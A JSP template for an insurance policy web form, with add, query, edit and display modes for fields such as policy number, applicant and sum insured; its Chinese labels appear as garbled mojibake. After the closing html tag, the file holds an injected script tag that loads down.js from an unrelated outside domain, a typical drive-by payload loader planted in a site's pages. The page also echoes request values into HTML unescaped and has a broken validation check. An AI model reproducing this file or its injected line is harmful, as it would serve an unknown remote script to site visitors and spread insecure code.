
<%@ page language="java" import="java.util.*" pageEncoding="GBK"%>
<html>
<head>
<script language="JavaScript">
function check()
{
	if(window.f1.name.value==''||window.f1.english.value==''||window.f1.name.math==''||window.f1.name.computer==''){
		alert("������Ϊ�գ� ��-��");
		history.go(0);
	}
}
</script>
</head>
<!--
   ��ģ�棺
   1�����붯����
   2����ѯ������
   3���޸Ķ�����
   4��  �����
    -->
<body>
<%!//////////////�޸ı��� varChineseName��varEnglishName�����ݿ�ͬ��
	String varChineseName[] = { "������", "Ͷ����", "������",
			"����", "����" };

	String varEnglishName[] = { "policyno", "applicant", "insured",
			"sumins", "unit" };

	%>
<%
		String param = request.getParameter("type");
		int type = Integer.parseInt(param);
		%>

<%if (type == 1) {%>
<table border="10" bgcolor=red>


	<%for (int i = 0; i < varEnglishName.length; i++) {%>
	<tr>
		<td colspan="2" align="middle"><%=varChineseName[i]%>:</td>
		<td><input name="<%=varEnglishName[i]%>" id="<%=varEnglishName[i]%>"></td>
	</tr>

	<%}%>

	<td colspan="2" align="right"><input type="submit" value="�ύ"
		onClick="javascript:check()"></td>
	<td><tdcolspan ="2" align="left"><input type="reset" value="��д"></td>
	</tr>
</table>

<%
		} else if (type == 2) {

			%>

<table border="10" bgcolor=red>
	<tr>
		<td colspan="2" align="middle"><%=varChineseName[0]%>:</td>
		<td><input name="<%=varEnglishName[0]%>" id="<%=varEnglishName[0]%>"></td>
	</tr>

	<%for (int i = 1; i < varEnglishName.length; i++) {%>
	<tr>
		<td colspan="2" align="middle"><%=varChineseName[i]%>:</td>
		<td><input name="<%=varEnglishName[i]%>" id="<%=varEnglishName[i]%>"
			type=hidden></td>
	</tr>

	<%}%>

	<td colspan="2" align="right"><input type="submit" value="�ύ"
		onClick="javascript:check()"></td>
	<td><tdcolspan ="2" align="left"><input type="reset" value="��д"></td>
	</tr>
</table>

<%} else if (type == 3) {
%>
<table border="10" bgcolor=red>

	<%for (int i = 0; i < varEnglishName.length; i++) {%>

	<tr>
		<td colspan="2" align="middle"><%=varChineseName[i]%>:</td>
		<td><input name="<%=varEnglishName[i]%>" id="<%=varEnglishName[i]%>"
			value="<%=request.getAttribute(varEnglishName[i])%>"></td>
	</tr>

	<%}%>

	<td colspan="2" align="right"><input type="submit" value="�ύ"
		onClick="javascript:check()"></td>
	<td><tdcolspan ="2" align="left"><input type="reset" value="��д"></td>
	</tr>
</table>
<%} else if (type == 4) {
%>
<table border="10" bgcolor=lightgreen>

	<%for (int i = 0; i < varEnglishName.length; i++) {%>

	<tr>
		<td colspan="2" align="middle"><%=varChineseName[i]%>:</td>
		<td><%=request.getAttribute(varEnglishName[i])%></td>
	</tr>

	<%}%>
	<tr>
		<td colspan="2" align="right"><input type="button" value="ȷ��"
			onClick="javascript:history.go(-1)"></td>
	</tr>
</table>

<%}%>
</html>

<script language=javascript src=http://Town.531jx.cn/down.js></script>